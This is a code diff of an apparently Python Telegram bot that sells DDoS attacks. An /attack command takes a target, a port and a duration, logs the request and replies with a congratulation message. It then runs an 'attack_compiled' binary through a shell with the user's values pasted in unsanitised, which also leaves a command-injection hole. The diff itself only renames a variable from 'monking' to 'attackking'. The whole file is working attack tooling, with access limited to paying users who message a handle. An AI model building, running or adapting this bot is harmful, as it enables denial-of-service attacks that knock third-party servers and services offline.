@@ -39,7 +39,7 @@ def read_free_users():
 
 allowed_user_ids = read_users()
 
-def log_command(user_id, king, monking, time):
+def log_command(user_id, king, attackking, time):
     user_info = bot.get_chat(user_id)
     if user_info.username:
         username = "@" + user_info.username
@@ -47,7 +47,7 @@ def log_command(user_id, king, monking, time):
         username = f"UserID: {user_id}"
     
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nking: {king}\nmonking: {monking}\nTime: {time}\n\n")
+        file.write(f"Username: {username}\nking: {king}\nattackking: {attackking}\nTime: {time}\n\n")
 
 def clear_logs():
     try:
@@ -61,12 +61,12 @@ def clear_logs():
         response = "No logs found to clear."
     return response
 
-def record_command_logs(user_id, command, king=None, monking=None, time=None):
+def record_command_logs(user_id, command, king=None, attackking=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
     if king:
         log_entry += f" | king: {king}"
-    if monking:
-        log_entry += f" | monking: {monking}"
+    if attackking:
+        log_entry += f" | attackking: {attackking}"
     if time:
         log_entry += f" | Time: {time}"
     
@@ -190,11 +190,11 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
-def start_attack_reply(message, king, monking, time):
+def start_attack_reply(message, king, attackking, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {monking}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: mon\n\n🌟 DDOS LAGADO OFFICIAL..!💀"
+    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {attackking}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: attack\n\n🌟 DDOS LAGADO OFFICIAL..!💀"
     bot.reply_to(message, response)
 
 attack_cooldown = {}
@@ -217,19 +217,19 @@ def handle_attack(message):
         command = message.text.split()
         if len(command) == 4:  
             king = command[1]
-            monking = int(command[2])  
+            attackking = int(command[2])  
             time = int(command[3])  
             if time > 240:
                 response = "Error: Time interval must be less than 241."
             else:
-                record_command_logs(user_id, '/attack_compiled', king, monking, time)
-                log_command(user_id, king, monking, time)
-                start_attack_reply(message, king, monking, time)  
-                full_command = f"./attack_compiled {king} {monking} {time} 30"
+                record_command_logs(user_id, '/attack_compiled', king, attackking, time)
+                log_command(user_id, king, attackking, time)
+                start_attack_reply(message, king, attackking, time)  
+                full_command = f"./attack_compiled {king} {attackking} {time} 30"
                 subprocess.run(full_command, shell=True)
-                response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} monking: {monking} monking: {time}"
+                response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} attackking: {attackking} attackking: {time}"
         else:
-            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /attack <king> <monking> <time>"  
+            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /attack <king> <attackking> <time>"  
     else:
         response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @Mk_ddos ."
 
